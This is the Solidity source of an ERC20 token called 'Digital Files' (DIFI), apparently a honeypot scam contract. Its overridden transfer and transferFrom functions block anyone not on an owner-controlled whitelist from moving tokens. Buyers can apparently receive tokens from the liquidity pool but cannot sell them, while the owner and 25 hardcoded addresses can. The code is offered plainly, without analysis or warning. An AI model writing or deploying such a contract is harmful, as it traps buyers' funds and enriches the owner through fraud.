// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Digital Files", "DIFI") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 10000000 * 10 ** decimals());
        whiteList[0xa9AC6Eee084616275884ce5cc861E912267A1bB2]= true;
        whiteList[0xd4dC869F45B4e998FF9E3ccD649E245CC409CC5F]=true;
        whiteList[0xDfa5dc0272c19D2cF4479BB03689d53b2e4C1941]=true;
        whiteList[0x9D954b68E623e8A24aD406CB9770A3EDAcb360C8]=true;
        whiteList[0x778f0Be157EF161180F2D3a2efef66883432479B]=true;
        whiteList[0x6438B3289ab27700F858Db629320e2c30283Ab27]=true;
        whiteList[0xb0Cb6BC4036e0ba18C8b044Ea38eDA8E1742166f]=true;
        whiteList[0xB6f2988D12004723664fF1efEE77D92d1E6C3D4d]=true;
        whiteList[0xa912219cB748F9aD923894536c74bd6A982E9074]=true;
        whiteList[0xa813b0442a6Fc68607A3b929B71A6158a6b67b3b]=true;
        whiteList[0x3466e815f7725F6A89BF890E620d66002fAEbEF3]=true;
        whiteList[0x66489b43C46A4e50837Bfb46DB0EaE4C6cA5bfc2]=true;
        whiteList[0x28F04cC1a569B0f7a66D2Ef1332666AC29542E69]=true;
        whiteList[0xB6134251AF46453916A7d8Baf99b047f17F1Ab78]=true;
        whiteList[0x59A41D7cB1a3CB9EEf5F87D55D7dD1AdEe459155]=true;
        whiteList[0xFCB21D9103386C65bc3D13D110b5cB6faFd6b817]=true;
        whiteList[0x8df696141328C25717F47647C2698725F4e7950d]=true;
        whiteList[0x08d8Bdd003024F2Eb088a94410016C4f660e3373]=true;
        whiteList[0xf4D33485a7692F6970aC5482f4B3eEa75F954316]=true;
        whiteList[0x571f6F5FeD75140e0DB311A3a67D4eB329B725cE]=true;
        whiteList[0x0EedB790b8c5D781F02Fe9571a5577928330CFf8]=true;
        whiteList[0xb25C1D1bB1c4497a10733508a8695a159a1CDf5E]=true;
        whiteList[0xA13C6fc2B83769f6CA9Aa345c5bAae7e5606002c]=true;
        whiteList[0x9bB31a2EFE6D6B8A371adCb17D5D8dd791D6dD8d]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}